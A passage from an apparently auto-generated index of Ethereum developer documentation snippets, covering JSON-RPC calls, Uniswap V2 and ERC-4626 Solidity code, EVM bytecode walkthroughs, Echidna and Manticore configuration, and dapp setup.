pending transactions on the Ethereum network, with its JSON-RPC request and response format.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_newPendingTransactionFilter\",\"params\":[],\"id\":73}'\n// Result\n{\n  \"id\":1,\n  \"jsonrpc\":  \"2.0\",\n  \"result\": \"0x1\" // 1\n}\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Contract Bytecode\nDESCRIPTION: The compiled bytecode of an ERC20 token contract implementation, ready for deployment on the Ethereum blockchain. This contains all the encoded contract functionality including transfer mechanisms, approval workflows, and balance tracking.\n\nLANGUAGE: evm-bytecode\nCODE:\n```\n00008152600401808060200182810382526022815260200180610fde6022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610c32576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602581526020018061104e6025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610cb8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180610fbb6023913960400191505060405180910390fd5b610cc3838383610fb5565b610d2e81604051806060016040528060268152602001611000602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610dc1816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290610f1a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610edf578082015181840152602081019050610ec4565b50505050905090810190601f168015610f0c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080828401905083811015610fab576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b50505056fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa264697066735822122081c840f087cef92feccb03fadc678b2708c331896ec5432b5d4c675f27b6d3e664736f6c63430006020033\n```\n\n----------------------------------------\n\nTITLE: IL1ERC20Bridge Interface Definition with ERC20DepositInitiated Event\nDESCRIPTION: Defines the IL1ERC20Bridge interface with the ERC20DepositInitiated event. This event is emitted when a deposit (transfer from L1 to L2) of ERC-20 tokens is initiated, tracking the source and destination token addresses and accounts.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @title IL1ERC20Bridge\n */\ninterface IL1ERC20Bridge {\n    /**********\n     * Events *\n     **********/\n\n    event ERC20DepositInitiated(\n```\n\n----------------------------------------\n\nTITLE: Storing Token Reserves with Efficient Storage Layout\nDESCRIPTION: Declares private variables to track the reserves of each token in the pool. These variables use a specific size (uint112) to allow packing multiple variables into a single storage slot for gas efficiency.\n\nLANGUAGE: solidity\nCODE:\n```\nuint112 private reserve0;           // uses single storage slot, accessible via getReserves\nuint112 private reserve1;           // uses single storage slot, accessible via getReserves\n```\n\n----------------------------------------\n\nTITLE: Navigational Button Links for Ethereum Roadmap Documentation\nDESCRIPTION: React/JSX component examples for navigational buttons that link to more detailed documentation about Danksharding, rollups, and other aspects of the Ethereum roadmap. These buttons are styled with an outline color variant.\n\nLANGUAGE: html\nCODE:\n```\n<ButtonLink variant=\"outline-color\" href=\"/roadmap/danksharding/\">More on Danksharding</ButtonLink>\n```\n\nLANGUAGE: html\nCODE:\n```\n<ButtonLink variant=\"outline-color\" href=\"/developers/docs/scaling/\">More on rollups</ButtonLink>\n```\n\n----------------------------------------\n\nTITLE: Processing ABI Method Signatures in EVM Bytecode\nDESCRIPTION: Code that extracts and processes the first 4 bytes of calldata (function selector) to determine which function to execute in the contract. This is the standard ABI method dispatch mechanism in Ethereum smart contracts.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\nPUSH1 0x00\nCALLDATALOAD\nPUSH1 0xe0\nSHR\nDUP1\nPUSH4 0x3cd8045e\nGT\nPUSH2 0x0043\nJUMPI\n```\n\n----------------------------------------\n\nTITLE: Making eth_call Request with curl\nDESCRIPTION: Example of how to make an HTTP request to the eth_call endpoint using curl. This method executes a message call without creating a transaction on the blockchain, commonly used for read-only contract functions.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_call\",\"params\":[{see above}],\"id\":1}'\n// Result\n{\n  \"id\":1,\n  \"jsonrpc\": \"2.0\",\n  \"result\": \"0x\"\n}\n```\n\n----------------------------------------\n\nTITLE: Taking Ownership of a Token in Solidity\nDESCRIPTION: Allows an approved address to take ownership of a specific token. This function checks if the caller is approved to transfer the token and then executes the transfer from the current owner to the caller.\n\nLANGUAGE: Solidity\nCODE:\n```\nfunction takeOwnership(uint256 _pizzaId) public {\n    require(_isApprovedOrOwner(msg.sender, _pizzaId), \"Address is not approved.\");\n    address owner = this.ownerOf(_pizzaId);\n    this.transferFrom(owner, msg.sender, _pizzaId);\n}\n```\n\n----------------------------------------\n\nTITLE: Sorting Token Addresses in Uniswap V2\nDESCRIPTION: Retrieves only the token0 address (lower address of the pair) while ignoring the second return value. This pattern helps save gas by avoiding unnecessary variable declarations.\n\nLANGUAGE: solidity\nCODE:\n```\n(address token0,) = UniswapV2Library.sortTokens(tokenA, tokenB);\n```\n\n----------------------------------------\n\nTITLE: Implementing Proxy-Enabled ERC-20 Functions in Solidity\nDESCRIPTION: Proxy versions of standard ERC-20 functions that allow the proxy to execute transfers and approvals on behalf of users. These functions include an additional parameter to specify the original sender address.\n\nLANGUAGE: solidity\nCODE:\n```\n   /* Functions that allow the proxy to actually proxy for accounts */\n\n    function transferProxy(address from, address to, uint256 amount)\n        public virtual onlyProxy() returns (bool)\n    {\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    function approveProxy(address from, address spender, uint256 amount)\n        public virtual onlyProxy() returns (bool)\n    {\n        _approve(from, spender, amount);\n        return true;\n    }\n\n    function transferFromProxy(\n        address spender,\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual onlyProxy() returns (bool)\n    {\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n```\n\n----------------------------------------\n\nTITLE: Setting up useEffect with Wallet Connection in React\nDESCRIPTION: Implementation of useEffect hook that loads the current message from the smart contract, sets up listeners, and retrieves the connected wallet information on component initialization.\n\nLANGUAGE: javascript\nCODE:\n```\nuseEffect(async () => {\n  const message = await loadCurrentMessage()\n  setMessage(message)\n  addSmartContractListener()\n\n  const { address, status } = await getCurrentWalletConnected()\n  setWallet(address)\n  setStatus(status)\n}, [])\n```\n\n----------------------------------------\n\nTITLE: Running the Transaction Script with Node.js\nDESCRIPTION: This command executes the sendTx.js script using Node.js to process the Ethereum transaction and send it to the network.\n\nLANGUAGE: bash\nCODE:\n```\nnode sendTx.js\n```\n\n----------------------------------------\n\nTITLE: Implementing Original Hashimoto Algorithm in Python\nDESCRIPTION: Implementation of Thaddeus Dryja's original Hashimoto algorithm that uses the blockchain as a dataset. This function takes a previous hash, merkle root, list of transactions, and nonce to produce a hash value.\n\nLANGUAGE: python\nCODE:\n```\ndef orig_hashimoto(prev_hash, merkle_root, list_of_transactions, nonce):\n    hash_output_A = sha256(prev_hash + merkle_root + nonce)\n    txid_mix = 0\n    for i in range(64):\n        shifted_A = hash_output_A >> i\n        transaction = shifted_A % len(list_of_transactions)\n        txid_mix ^= list_of_transactions[transaction] << i\n    return txid_mix ^ (nonce << 192)\n```\n\n----------------------------------------\n\nTITLE: Echidna Configuration for Corpus Collection\nDESCRIPTION: YAML configuration for enabling coverage tracking and corpus collection in Echidna, specifying the directory where corpus files will be stored.\n\nLANGUAGE: yaml\nCODE:\n```\ncoverage: true\ncorpusDir: \"corpus-magic\"\n```\n\n----------------------------------------\n\nTITLE: Implementing Balance Management Functions in Uniswap V2 Pair Contract\nDESCRIPTION: The skim and sync functions handle balance discrepancies in the pair contract. skim allows withdrawal of excess tokens to any address, while sync updates the reserves to match the current token balances.\n\nLANGUAGE: solidity\nCODE:\n```\n    // force balances to match reserves\n    function skim(address to) external lock {\n        address _token0 = token0; // gas savings\n        address _token1 = token1; // gas savings\n        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));\n        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));\n    }\n\n\n\n    // force reserves to match balances\n    function sync() external lock {\n        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Loading NFT Smart Contract with Alchemy Web3\nDESCRIPTION: Code to load the NFT smart contract using its ABI and address with Alchemy Web3, which will be used for minting NFTs on the Ethereum blockchain.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst alchemyKey = process.env.REACT_APP_ALCHEMY_KEY\nconst { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\")\nconst web3 = createAlchemyWeb3(alchemyKey)\n\nconst contractABI = require(\"../contract-abi.json\")\nconst contractAddress = \"0x4C4a07F737Bf57F6632B6CAB089B78f62385aCaE\"\n```\n\n----------------------------------------\n\nTITLE: Verifying the Ethereum on ARM Image Hash with SHA256\nDESCRIPTION: Command to verify the SHA256 hash of the downloaded Ethereum on ARM image file to ensure integrity. This verification step is crucial before flashing the image to the MicroSD card.\n\nLANGUAGE: sh\nCODE:\n```\n# From directory containing the downloaded image\nshasum -a 256 ethonarm_22.04.00.img.zip\n# Hash should output: fb497e8f8a7388b62d6e1efbc406b9558bee7ef46ec7e53083630029c117444f\n```\n\n----------------------------------------\n\nTITLE: Running Echidna with Configuration File\nDESCRIPTION: Command to run Echidna with a specific configuration file, which successfully finds the sequence of function calls to violate the property when reset functions are blacklisted.\n\nLANGUAGE: bash\nCODE:\n```\n$ echidna-test multi.sol --config blacklist.yaml\n...\nechidna_state4: failed!💥\n  Call sequence:\n    f(12)\n    g(8)\n    h(42)\n    i()\n```\n\n----------------------------------------\n\nTITLE: Displaying Client-Server Architecture for Web 2.0 in Markdown\nDESCRIPTION: Markdown image tag showing the client-server architecture representing Web 2.0, illustrating the read-write nature of the current internet dominated by large companies.\n\nLANGUAGE: markdown\nCODE:\n```\n![Client-Server-Architektur, die Web 2.0 darstellt](./web2.png)\n```\n\n----------------------------------------\n\nTITLE: Memory Buffer to uint256 Utility Function\nDESCRIPTION: A helper function that extracts a uint256 value from a memory buffer at a specified offset. Used to verify function call results when testing with low-level call mechanisms.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Read a uint from a memory buffer (to make sure we get back the parameters\n    // we sent out)\n    function toUint256(bytes memory _bytes, uint256 _start) internal pure\n        returns (uint256)\n    {\n        require(_bytes.length >= _start + 32, \"toUint256_outOfBounds\");\n        uint256 tempUint;\n\n        assembly {\n            tempUint := mload(add(add(_bytes, 0x20), _start))\n        }\n\n        return tempUint;\n    }     // toUint256\n```\n\n----------------------------------------\n\nTITLE: Echidna Whitelist Configuration File\nDESCRIPTION: A YAML configuration file for Echidna that only allows specific functions (f, g, h, i) to be called during fuzzing.\n\nLANGUAGE: yaml\nCODE:\n```\nfilterBlacklist: false\nfilterFunctions: [\"f\", \"g\", \"h\", \"i\"]\n```\n\n----------------------------------------\n\nTITLE: Updating Reserves and Price Accumulators in UniswapV2Pair (Solidity)\nDESCRIPTION: The _update function is called whenever tokens are deposited or withdrawn from the pool. It updates the reserves, checks for overflows, and updates price accumulators on the first transaction of each block to enable time-weighted average price calculations.\n\nLANGUAGE: solidity\nCODE:\n```\n    // update reserves and, on the first call per block, price accumulators\n    function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        require(balance0 <= uint112(-1) && balance1 <= uint112(-1), 'UniswapV2: OVERFLOW');\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        uint32 blockTimestamp = uint32(block.timestamp % 2**32);\n        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\n        if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n            // * never overflows, and + overflow is desired\n            price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;\n            price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;\n        }\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        reserve0 = uint112(balance0);\n        reserve1 = uint112(balance1);\n        blockTimestampLast = blockTimestamp;\n        emit Sync(reserve0, reserve1);\n    }\n```\n\n----------------------------------------\n\nTITLE: Importing Operators for Constraints in Manticore\nDESCRIPTION: Shows how to import and use the Operators module for creating and manipulating constraints in Manticore analysis.\n\nLANGUAGE: python\nCODE:\n```\nfrom manticore.core.smtlib import Operators\n```\n\n----------------------------------------\n\nTITLE: Error Handling for Invalid Key Values in Solidity Cache Encoding\nDESCRIPTION: This code snippet handles error cases when a key value exceeds the maximum allowed range. It prevents future bugs by explicitly reverting the transaction if an unexpected key value is encountered.\n\nLANGUAGE: solidity\nCODE:\n```\n// If we get here, something is wrong.\nrevert(\"Error in encodeVal, should not happen\");\n```\n\n----------------------------------------\n\nTITLE: Creating Zero-Knowledge Dig Function\nDESCRIPTION: Implements a function that creates a zero-knowledge proof for the result of digging at a specific coordinate on the game map, including bounds checking.\n\nLANGUAGE: typescript\nCODE:\n```\nconst zkDig = function(map: boolean[][], x: number, y: number) : any {\n    if (x<0 || x>=width || y<0 || y>=height)\n        throw new Error(\"Trying to dig outside the map\")\n```\n\n----------------------------------------\n\nTITLE: Calculating Token Amounts for Liquidity Removal in Uniswap V2\nDESCRIPTION: Calculates pro-rata distribution of both tokens based on the proportion of liquidity being burned. Ensures providers receive equal value of both tokens to maintain the exchange rate.\n\nLANGUAGE: solidity\nCODE:\n```\nbool feeOn = _mintFee(_reserve0, _reserve1);\nuint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\namount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\namount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\nrequire(amount0 > 0 && amount1 > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED');\n```\n\n----------------------------------------\n\nTITLE: Converting Assets to Shares in ERC-4626 Vault (Solidity)\nDESCRIPTION: This function calculates how many shares would be exchanged by the vault for the provided amount of assets.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction convertToShares(uint256 assets) public view returns (uint256 shares)\n```\n\n----------------------------------------\n\nTITLE: Querying Ether Balance from an Ethereum Account\nDESCRIPTION: This example demonstrates how to query the ether balance of an Ethereum account by inspecting the account's 'balance' field. The balance is denominated in wei, which is the smallest unit of ether (10^-18 ETH).\n\nLANGUAGE: javascript\nCODE:\n```\n// Assuming web3.js is used to interact with Ethereum\nconst getBalance = async (address) => {\n  // Request balance from node\n  const balanceInWei = await web3.eth.getBalance(address);\n  \n  // Convert from wei to ether for readability\n  const balanceInEther = web3.utils.fromWei(balanceInWei, 'ether');\n  \n  return {\n    wei: balanceInWei,\n    ether: balanceInEther\n  };\n};\n```\n\n----------------------------------------\n\nTITLE: Token Addresses Storage in Uniswap V2 Pair\nDESCRIPTION: Stores the addresses of the two ERC-20 token contracts that can be exchanged through this liquidity pool.\n\nLANGUAGE: solidity\nCODE:\n```\naddress public token0;\naddress public token1;\n```\n\n----------------------------------------\n\nTITLE: eth_getUncleCountByBlockNumber Request and Response Example\nDESCRIPTION: A complete cURL request and response example for the eth_getUncleCountByBlockNumber method. This demonstrates how to query the number of uncles in a block using the block number and the expected JSON-RPC response format.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getUncleCountByBlockNumber\",\"params\":[\"0xe8\"],\"id\":1}'\n// Result\n{\n  \"id\":1,\n  \"jsonrpc\": \"2.0\",\n  \"result\": \"0x0\" // 0\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Approval and TransferFrom with Controlled Contract\nDESCRIPTION: JavaScript code that tests the approval and transferFrom functionality of the CalldataInterpreter. It demonstrates how to create approval and transferFrom transactions with minimal calldata, then verifies the tokens were correctly transferred.\n\nLANGUAGE: javascript\nCODE:\n```\n// approval and transferFrom\nconst approveTx = {\n  to: cdi.address,\n  data: \"0x03\" + poorSigner.address.slice(2, 42) + \"00FF\",\n}\nawait (await signer.sendTransaction(approveTx)).wait()\n\nconst destAddr2 = \"0xE1165C689C0c3e9642cA7606F5287e708d846206\"\n\nconst transferFromTx = {\n  to: cdi.address,\n  data: \"0x04\" + signer.address.slice(2, 42) + destAddr2.slice(2, 42) + \"00FF\",\n}\nawait (await poorSigner.sendTransaction(transferFromTx)).wait()\n\n// Check the approve / transferFrom combo was done correctly\nexpect(await token.balanceOf(destAddr2)).to.equal(255)\n```\n\n----------------------------------------\n\nTITLE: Retrieving Total Supply of Shares in ERC-4626 Vaults in Solidity\nDESCRIPTION: This function returns the total number of unredeemed vault shares in circulation.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction totalSupply() public view returns (uint256)\n```\n\n----------------------------------------\n\nTITLE: CREATE2 Operation in EVM\nDESCRIPTION: Creates a new contract with code from memory at a deterministic address based on a salt value. Allows for predictable contract deployment addresses.\n\nLANGUAGE: solidity\nCODE:\n```\naddr = keccak256(0xff ++ address(this) ++ salt ++ keccak256(mem[ost:ost+len-1]))[12:]\n```\n\n----------------------------------------\n\nTITLE: 51% Attack Strategy in Blockchain Networks\nDESCRIPTION: A step-by-step description of how a malicious attacker might attempt to execute a 51% attack on the blockchain by creating a fork with an alternative transaction history. This attack requires more computational power than the rest of the network combined.\n\nLANGUAGE: pseudocode\nCODE:\n```\n1. Send 100 BTC to a merchant in exchange for some product (preferably a rapid-delivery digital good)\n2. Wait for the delivery of the product\n3. Produce another transaction sending the same 100 BTC to himself\n4. Try to convince the network that his transaction to himself was the one that came first.\n```\n\n----------------------------------------\n\nTITLE: Memory to Return Value Preparation in EVM Bytecode\nDESCRIPTION: Shared code for preparing memory data to be returned. This code takes a memory pointer from the stack, calculates the length of data to return, and executes the RETURN opcode. It's used by multiple functions including splitter() and currentWindow().\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\nE4 | JUMPDEST            | X\nE5 | PUSH1 0x40          | 0x40 X\nE7 | MLOAD               | 0x80 X\nE8 | DUP1                | 0x80 0x80 X\nE9 | SWAP2               | X 0x80 0x80\nEA | SUB                 | X-0x80 0x80\nEB | SWAP1               | 0x80 X-0x80\nEC | RETURN              |\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies for the Secret State Project\nDESCRIPTION: Commands to install the required packages and tools, including pnpm for package management and mprocs for running multiple processes.\n\nLANGUAGE: shell\nCODE:\n```\ncd 20240901-secret-state/\npnpm install\nnpm install -g mprocs\n```\n\n----------------------------------------\n\nTITLE: Withdraw Event in ERC-4626 Vault\nDESCRIPTION: This event must be emitted when shares are withdrawn from the vault via the redeem or withdraw methods. It tracks the sender, receiver, owner, amount of assets, and corresponding shares.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Withdraw(\n    address indexed sender,\n    address indexed receiver,\n    address indexed owner,\n    uint256 assets,\n    uint256 shares\n)\n```\n\n----------------------------------------\n\nTITLE: Rendering a Button Link in React for GitHub Issues\nDESCRIPTION: This code creates a button link that directs users to view all GitHub issues for the ethereum.org website repository.\n\nLANGUAGE: jsx\nCODE:\n```\n<ButtonLink href=\"https://github.com/ethereum/ethereum-org-website/issues\">Tekintse meg az összes feladatot</ButtonLink>\n```\n\n----------------------------------------\n\nTITLE: Verificando Saldos Após Transação Ethereum com Web3.py\nDESCRIPTION: Consulta os saldos das contas de origem e destino após uma transação para verificar se a transferência de ether foi bem-sucedida.\n\nLANGUAGE: python\nCODE:\n```\nw3.eth.get_balance(w3.eth.accounts[0])\nw3.eth.get_balance(w3.eth.accounts[1])\n```\n\n----------------------------------------\n\nTITLE: Initialisation du projet avec npm/yarn\nDESCRIPTION: Commandes Bash pour créer la structure de projet initiale et installer les dépendances nécessaires pour un projet Waffle.\n\nLANGUAGE: bash\nCODE:\n```\nmkdir dynamic-mocking\ncd dynamic-mocking\nmkdir contracts src\n\nyarn init\n# or if you're using npm\nnpm init\n```\n\n----------------------------------------\n\nTITLE: Configurando Arquivo .env para Credenciais Ethereum\nDESCRIPTION: Exemplo de configuração do arquivo .env contendo a URL da API da Alchemy e a chave privada Ethereum, necessários para assinar e enviar transações.\n\nLANGUAGE: JavaScript\nCODE:\n```\nAPI_URL = \"your-api-url\"\nPRIVATE_KEY = \"your-private-key\"\n```\n\n----------------------------------------\n\nTITLE: Accessing Workspace in Manticore\nDESCRIPTION: Shows how to access the workspace directory where Manticore stores all generated output files from the analysis.\n\nLANGUAGE: python\nCODE:\n```\nprint(\"Results are in {}\".format(m.workspace))\n```\n\n----------------------------------------\n\nTITLE: Constraining Symbolic Address in Manticore\nDESCRIPTION: Example of creating a symbolic address value and adding global constraints to limit its possible values during exploration.\n\nLANGUAGE: python\nCODE:\n```\nsymbolic_address = m.make_symbolic_value()\nm.constraint(Operators.OR(symbolic == 0x41, symbolic_address == 0x42))\nm.transaction(caller=user_account,\n              address=contract_account,\n              data=m.make_symbolic_buffer(320),\n              value=0)\n```\n\n----------------------------------------\n\nTITLE: Executing GraphQL Query with React Hooks to Fetch Player Data\nDESCRIPTION: Uses Apollo Client's useQuery hook to fetch player statistics including game counts, win/loss records, and bet timestamps. The example demonstrates how to structure a GraphQL query and process the returned data in a React component.\n\nLANGUAGE: javascript\nCODE:\n```\nconst myGraphQlQuery = gql`\n    players(where: { id: $currentUser }) {\n      totalPlayedCount\n      hasWonCount\n      hasLostCount\n      bets {\n        time\n      }\n    }\n`\n\nconst { loading, error, data } = useQuery(myGraphQlQuery)\n\nReact.useEffect(() => {\n  if (!loading && !error && data) {\n    console.log({ data })\n  }\n}, [loading, error, data])\n```\n\n----------------------------------------\n\nTITLE: Implementing Cached Entry Writing in Solidity WORM Contract\nDESCRIPTION: Function that handles writing entries with cached parameters. It reads two parameters from the cache and passes them to the actual writeEntry function, demonstrating parameter caching usage.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction writeEntryCached() external {\n        uint[] memory params = _readParams(2);\n        writeEntry(params[0], params[1]);\n    }    // writeEntryCached\n```\n\n----------------------------------------\n\nTITLE: Implementing UpgradeStatus Component for The Merge in React/JSX\nDESCRIPTION: A React/JSX component displaying the upgrade status of The Merge, indicating it was successfully implemented on September 15, 2022, marking Ethereum's transition to proof-of-stake and reducing energy consumption by ~99.95%.\n\nLANGUAGE: jsx\nCODE:\n```\n<UpgradeStatus isShipped dateKey=\"page-upgrades:page-upgrades-beacon-date\">\n  The Merge was executed on September 15, 2022. This completed Ethereum's transition to proof-of-stake consensus, officially deprecating proof-of-work and reducing energy consumption by ~99.95%.\n</UpgradeStatus>\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode Analysis for merkleRoot() Function\nDESCRIPTION: This code snippet shows the bytecode operations for merkleRoot() function which loads Storage[0], prepares for a jump to position 0xDA, and ultimately returns Storage[0] value.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\nF9 JUMPDEST           |                      \nFA POP                |                      \nFB PUSH2 0x00da       | 0xDA                 \nFE PUSH1 0x00         | 0x00 0xDA            \n100 SLOAD              | Storage[0] 0xDA      \n101 DUP2               | 0xDA Storage[0] 0xDA \n102 JUMP               | Storage[0] 0xDA      \n```\n\n----------------------------------------\n\nTITLE: Stopping and Disabling Geth Client\nDESCRIPTION: Command to stop and disable the Geth Ethereum client running as a systemd service.\n\nLANGUAGE: bash\nCODE:\n```\nsudo systemctl stop geth && sudo systemctl disable geth\n```\n\n----------------------------------------\n\nTITLE: Withdrawing Assets from ERC-4626 Vaults in Solidity\nDESCRIPTION: This function burns shares from the owner and sends the exact amount of underlying tokens from the vault to the receiver.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction withdraw(uint256 assets, address receiver, address owner) public returns (uint256 shares)\n```\n\n----------------------------------------\n\nTITLE: Creating New Branch for Changes in Shell\nDESCRIPTION: Command to create a new git branch for your contribution. This isolates your changes from the main development branch.\n\nLANGUAGE: shell\nCODE:\n```\ngit checkout -b new_branch_name\n```\n\n----------------------------------------\n\nTITLE: Echidna Configuration for Function Filtering in YAML\nDESCRIPTION: A YAML configuration example for Echidna that demonstrates how to filter out specific functions during fuzzing tests. It shows settings to blacklist the 'pop' and 'clear' functions to achieve more accurate gas estimates.\n\nLANGUAGE: yaml\nCODE:\n```\nfilterBlacklist: true\nfilterFunctions: [\"pop\", \"clear\"]\n```\n\n----------------------------------------\n\nTITLE: Implementação de um contrato de cache em Solidity\nDESCRIPTION: Contrato que implementa um mecanismo de cache com mapeamentos de valor para chave e chave para valor, junto com constantes para controle de armazenamento. Inclui funções para leitura, escrita e codificação de valores no cache.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\n\ncontract Cache {\n\n    bytes1 public constant INTO_CACHE = 0xFF;\n    bytes1 public constant DONT_CACHE = 0xFE;\n```\n\n----------------------------------------\n\nTITLE: Defining Algorithm Parameters for Dagger-Hashimoto\nDESCRIPTION: Configuration parameters for the Dagger-Hashimoto algorithm, including dataset size, cache size, difficulty, and various constants used for DAG generation and hashing. The parameters define key aspects of the algorithm's behavior.\n\nLANGUAGE: python\nCODE:\n```\nSAFE_PRIME_512 = 2**512 - 38117     # Largest Safe Prime less than 2**512\n\nparams = {\n      \"n\": 4000055296 * 8 // NUM_BITS,  # Size of the dataset (4 Gigabytes); MUST BE MULTIPLE OF 65536\n      \"n_inc\": 65536,                   # Increment in value of n per period; MUST BE MULTIPLE OF 65536\n                                        # with epochtime=20000 gives 882 MB growth per year\n      \"cache_size\": 2500,               # Size of the light client's cache (can be chosen by light\n                                        # client; not part of the algo spec)\n      \"diff\": 2**14,                    # Difficulty (adjusted during block evaluation)\n      \"epochtime\": 100000,              # Length of an epoch in blocks (how often the dataset is updated)\n      \"k\": 1,                           # Number of parents of a node\n      \"w\": w,                          # Used for modular exponentiation hashing\n      \"accesses\": 200,                  # Number of dataset accesses during hashimoto\n      \"P\": SAFE_PRIME_512               # Safe Prime for hashing and random number generation\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing burn Function in Vyper ERC-721\nDESCRIPTION: This function allows authorized users to burn (destroy) tokens. It performs security checks to verify the caller is authorized and the token exists, then removes the token from circulation and emits a Transfer event to the zero address.\n\nLANGUAGE: vyper\nCODE:\n```\n@external\ndef burn(_tokenId: uint256):\n    \"\"\"\n    @dev Burns a specific ERC721 token.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\n         address for this NFT.\n         Throws if `_tokenId` is not a valid NFT.\n    @param _tokenId uint256 id of the ERC721 token to be burned.\n    \"\"\"\n    # Check requirements\n    assert self._isApprovedOrOwner(msg.sender, _tokenId)\n    owner: address = self.idToOwner[_tokenId]\n    # Throws if `_tokenId` is not a valid NFT\n    assert owner != ZERO_ADDRESS\n    self._clearApproval(owner, _tokenId)\n    self._removeTokenFrom(owner, _tokenId)\n    log Transfer(owner, ZERO_ADDRESS, _tokenId)\n```\n\n----------------------------------------\n\nTITLE: Executing Optimistic Token Transfers During Swap\nDESCRIPTION: Transfers tokens to the recipient optimistically (before ensuring all conditions are met) and validates that the destination is not one of the pool tokens. If the swap fails later, these transfers will be reverted.\n\nLANGUAGE: solidity\nCODE:\n```\naddress _token0 = token0;\naddress _token1 = token1;\nrequire(to != _token0 && to != _token1, 'UniswapV2: INVALID_TO');\nif (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\nif (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n```\n\n----------------------------------------\n\nTITLE: Executing GraphQL Query with React Hooks to Fetch Player Data\nDESCRIPTION: Uses Apollo Client's useQuery hook to fetch player statistics including game counts, win/loss records, and bet timestamps. The example demonstrates how to structure a GraphQL query and process the returned data in a React component.\n\nLANGUAGE: javascript\nCODE:\n```\nconst myGraphQlQuery = gql`\n    players(where: { id: $currentUser }) {\n      